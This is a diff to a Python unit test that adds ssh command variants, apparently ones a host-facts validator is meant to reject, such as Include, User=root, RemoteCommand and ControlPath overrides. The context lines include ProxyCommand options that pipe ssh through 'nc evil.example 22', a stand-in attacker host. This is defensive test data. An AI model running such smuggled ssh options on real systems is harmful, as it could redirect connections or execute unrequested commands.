@@ -56,12 +56,18 @@ class MacOSHostFactsTests(unittest.TestCase):
             f"ssh -o ProxyJump=jump.example devbox {remote}",
             f"ssh -o 'ProxyCommand=nc evil.example 22' devbox {remote}",
             f"ssh -oProxyCommand='nc evil.example 22' devbox {remote}",
+            f"ssh -o Include=/tmp/alternate-config devbox {remote}",
+            f"ssh -o User=root devbox {remote}",
+            f"ssh -o Port=2222 devbox {remote}",
+            f"ssh -o ControlPath=/tmp/alternate.sock devbox {remote}",
+            f"ssh -o RemoteCommand=hostname devbox {remote}",
             f"ssh -F /tmp/alternate-config devbox {remote}",
             f"ssh -F/tmp/alternate-config devbox {remote}",
             f"ssh -p 2222 devbox {remote}",
             f"ssh -p2222 devbox {remote}",
             f"ssh -l root devbox {remote}",
             f"ssh -lroot devbox {remote}",
+            f"ssh -S /tmp/alternate.sock devbox {remote}",
         )
         for command in commands:
             with self.subTest(command=command):
